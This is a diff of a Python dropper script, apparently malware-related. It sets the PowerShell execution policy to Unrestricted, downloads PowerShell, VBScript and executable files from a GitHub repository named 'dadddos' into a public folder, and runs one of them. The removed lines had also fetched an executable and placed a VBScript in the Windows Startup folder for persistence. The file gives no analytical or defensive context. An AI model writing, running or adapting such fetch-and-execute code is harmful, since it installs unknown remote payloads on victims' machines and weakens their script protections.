@@ -6,9 +6,6 @@ change_execution_policy = 'Set-ExecutionPolicy Unrestricted -Scope Process -Forc
 # Lista de comandos para descargar archivos y ejecutarlos
 commands = [
     'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/MainWinStyle.ps1 -OutFile C:\\Users\\Public\\MainWinStyle.ps1',
-    'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/s44.vbs -OutFile C:\\Users\\Public\\s44.vbs',
-    'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/RNM.exe -OutFile C:\\Users\\Public\\RNM.exe',
-    'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/s44.vbs -OutFile "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\s44.vbs"',
     'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/tasl.ps1 -OutFile C:\\Users\\Public\\tasl.ps1',
     'C:\\Users\\Public\\tasl.ps1',
     'Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/dlhsty.ps1 -OutFile C:\\Users\\Public\\dlhsty.ps1',
@@ -35,3 +32,4 @@ try:
 
 except subprocess.CalledProcessError as e:
     print(f"Error occurred: {e}")
+
